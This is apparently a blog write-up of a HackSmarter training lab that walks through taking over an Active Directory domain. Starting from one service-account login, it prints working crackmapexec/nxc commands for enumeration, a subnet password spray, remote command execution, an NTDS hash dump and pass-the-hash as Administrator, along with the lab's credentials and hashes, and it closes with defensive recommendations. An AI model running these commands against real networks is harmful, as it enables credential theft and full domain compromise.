---
layout: post
title: "Active Directory Domain Compromise: From Valid Credentials to Full Domain Takeover"
date: 2026-07-21 23:50:00 +0400
---

## Introduction

This lab is from [HackSmarter](https://www.hacksmarter.org/courses/8da0b008-7692-4c3f-a861-b7a02a536e7b/take), and it's a simulation of something I think about a lot in this field: how much damage a single set of low-privilege credentials can do in the wrong environment. I wasn't handed admin access, a misconfigured server, or an obvious exploit. I was handed one working username and password for a service account, `ATHENA_SVC`, and the rest was up to me.

By the end, that one account had led me to full control of the domain: every password hash in Active Directory, the keys to forge Kerberos tickets at will, and Administrator access on the Domain Controller itself. Here's how it happened.

**Domain:** `DRY.MARTINI.BARS` · **DC:** `DC01` (`10.1.221.180`) · **Starting creds:** `ATHENA_SVC` / `1dirtymartini`

---

## Getting my bearings

The first thing I do in any engagement, real or simulated, is figure out what I'm actually looking at before I touch anything else. With one valid credential, LDAP is the quickest way to see the shape of a domain: who exists, what's out there, and where the interesting targets might be.

```bash
nxc ldap 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --users
```

The credentials held up, and the domain handed over its user list without a fight: `Administrator`, `Guest`, `krbtgt`, `mprice`, `athena.t0`, and `ATHENA_SVC` itself.

![Valid credentials and domain user list from LDAP enumeration](/assets/images/img1.png)

Six accounts isn't a lot to work with, but every name on that list is a potential lead. I made a note of `athena.t0` and `mprice` in particular, since human-looking accounts tend to be softer targets than service accounts.

Next I wanted to know what machines actually made up this domain, since attacking a Domain Controller blind is a bad idea.

```bash
nxc ldap 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --query "(objectClass=computer)" ""
```

Two machines came back: `DC01` and `EVILPC`. `DC01` was obviously the prize here, the Domain Controller itself.

![Domain computer objects DC01 and EVILPC](/assets/images/img2.png)

![Domain computer objects DC01 and EVILPC](/assets/images/img2-1.png)

With a target locked in, I checked what doors were actually open to me on the network.

```bash
nxc smb 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --shares
```

The share list came back with the usual suspects, `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`, plus one that stood out: `notes`, where `ATHENA_SVC` had **READ/WRITE** access. That's the kind of thing worth remembering even if I don't use it immediately. Write access on a share is a foothold, whether it's for staging a payload or just reading something I'm not supposed to.

![SMB share listing showing notes share with READ/WRITE](/assets/images/img3.png)

## The mistake that broke the case open

Enumeration only gets you so far. What actually turns a foothold into a compromise is almost always human error, and this engagement was no exception.

I had a short list of usernames from the LDAP query, so I built a target list and tested something simple: was this password being reused anywhere else in the domain?

![User list](/assets/images/img4.png)

```bash
crackmapexec smb 10.1.221.0/24 -u users.txt -d DRY.MARTINI.BARS -p '1dirtymartini'
```

It was.

```
DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```

`athena.t0` was using the exact same password as the service account. And as I was about to find out, this wasn't just another user login, `athena.t0` had administrative rights on the Domain Controller. One reused password had just handed me the keys to the whole environment.

![Password spray hit showing athena.t0 Pwn3d](/assets/images/img4-1.png)

## Confirming how far this actually went

Finding a hit is one thing. Proving what it actually gets you is another, so I checked exactly what `athena.t0` had access to.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --shares
```

```
ADMIN$   READ,WRITE
C$       READ,WRITE
```

Full read/write on `ADMIN$` and `C$` is about as clear a signal as it gets. This wasn't a limited user account that happened to reuse a password, it was a fully privileged one.

![Admin shares ADMIN and C with read write access](/assets/images/img5.png)

To remove any doubt, I ran a command directly on the Domain Controller.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' -x "whoami"
```

```
dry\athena.t0
```

That was the moment the engagement shifted. This wasn't enumeration anymore, the Domain Controller was compromised, and I had administrative code execution on it.

![Whoami output confirming execution as athena.t0](/assets/images/img6.png)

## Taking everything the domain had

With that level of access, there was really only one next move: pull the entire Active Directory password database and see exactly what I was dealing with.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --ntds
```

Every account in the domain came back with its hash: `Administrator`, `krbtgt`, `mprice`, `athena.t0`, `ATHENA_SVC`, `DC01$`, `EVILPC$`. At this point I had, in one file, everything an attacker would need to move freely through this environment.

![NTDS dump showing full account list and hashes](/assets/images/img7.png)

One entry mattered more than the rest: `krbtgt`, hash `22ebc290e67668629c8d0812662a9c51`. This is the account Kerberos itself relies on, and owning its hash means being able to forge valid authentication tickets on demand. It's the difference between a compromise you can clean up by resetting a few passwords, and one that persists no matter what the defenders do afterward, unless they specifically know to rotate this account too.

## Proving it beyond doubt

I had hashes. The question was whether I actually needed the plaintext passwords behind them, and the answer, as usual with Windows authentication, was no.

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS
```

```
DRY.MARTINI.BARS\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
```

No password. No cracking. Just the hash itself, straight from the NTDS dump, authenticating as the domain's most privileged account.

![Pass the hash authentication as Administrator Pwn3d](/assets/images/img8.png)

And to close the loop, I confirmed it the same way I had before:

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS -x "whoami"
```

```
dry\administrator
```

![Whoami output confirming execution as domain administrator](/assets/images/img9.png)

Starting from one service account, the domain was now completely mine.

---

## The path it took

```
ATHENA_SVC creds → LDAP enum → password reuse → athena.t0 admin
→ NTDS dump → KRBTGT exposed → Pass-the-Hash → Administrator
```

Every step here followed logically from the last. Nothing about this required a zero-day or a clever exploit, it required patience, a methodical process, and paying attention to the small mistakes that real environments make all the time.

## What didn't work

Not every avenue paid off, and I think that's worth including rather than leaving out.

**BloodHound collection was refused.** The Domain Controller had LDAP signing enforced, which blocks the kind of unsigned collection BloodHound relies on by default. A good reminder that some of the "standard" tooling in this field assumes a level of misconfiguration that isn't always there.

**Direct SMB access using just the hash failed at first.** `smbclient` expects a plaintext password by default, not an NT hash, so a hash-aware tool was needed instead. Small thing, but it's the kind of detail that trips people up if they assume every tool handles authentication the same way.

## Why this mattered

None of this was the result of a sophisticated attack. It was the result of ordinary, common mistakes: a password reused between a service account and a privileged user, and a user account carrying far more administrative rights than it needed. Put those two things together, and one compromised credential is enough to walk away with the entire domain.

## What I'd recommend fixing

- Enforce unique passwords across every account, service and human alike
- Apply least privilege consistently, no account should hold more rights than its role requires
- Watch for abnormal SMB authentication patterns, especially spray-style attempts across a subnet
- Move service accounts to gMSA instead of static, human-managed passwords
- Require MFA on privileged accounts wherever the environment allows it
- Audit Active Directory permissions and group memberships on a regular schedule, not just after an incident
